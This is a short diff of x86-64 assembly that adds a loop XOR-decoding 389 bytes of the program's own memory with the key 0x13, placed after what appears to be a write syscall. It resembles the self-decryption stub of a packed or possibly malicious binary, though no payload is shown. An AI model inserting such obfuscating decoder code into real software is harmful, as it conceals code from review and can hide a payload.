@@ -24,6 +24,17 @@
 	mov al, 1
 	syscall
 
+	xor rax,rax
+	sub r12,4104
+	mov rax,r12
+	mov rdx,0
+loop:
+	xor byte [rax],0x13
+	add rax,1
+	add	rdx,1
+	cmp rdx,389
+	jl	loop
+
 	pop rax
 	pop rax
 	pop rax
